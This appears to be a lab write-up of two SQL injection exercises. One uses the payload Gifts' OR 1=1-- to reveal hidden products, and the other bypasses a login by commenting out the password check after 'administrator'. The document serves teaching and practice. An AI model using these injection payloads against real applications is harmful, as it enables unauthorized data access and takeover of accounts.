# SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
## Lab Description
![image](Picture/lab1.png)

The query used by the application is provided in the lab description:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
This query retrieves information from the `products` table, specifically selecting products that belong to the `category` with the condition `released = 1`, meaning the products have been released.

To see all products, we need to make this condition `TRUE`.
```sql
Gifts' OR 1=1--
```
The condition `1=1` is always true, and `--` is used to start a comment in SQL, so everything after it is ignored.

# SQL Injection Vulnerability Allowing Login Bypass
## Lab Description
![image](Picture/lab2.png)

The query used in the lab will look something like:
```sql
SELECT * FROM users WHERE username = 'username' AND password = 'password';
```
I try to inject into the username field with `--` to bypass the `AND password = 'password'` condition.

```sql
WHERE username = 'administrator' --
```

This will result in a query like:
```sql
SELECT * FROM users WHERE username = 'administrator' -- ' AND password = '<PASSWORD>'
```
![image](Picture/loginbypass.png)

The final query becomes:
```sql
SELECT * FROM users WHERE username = 'administrator';
```
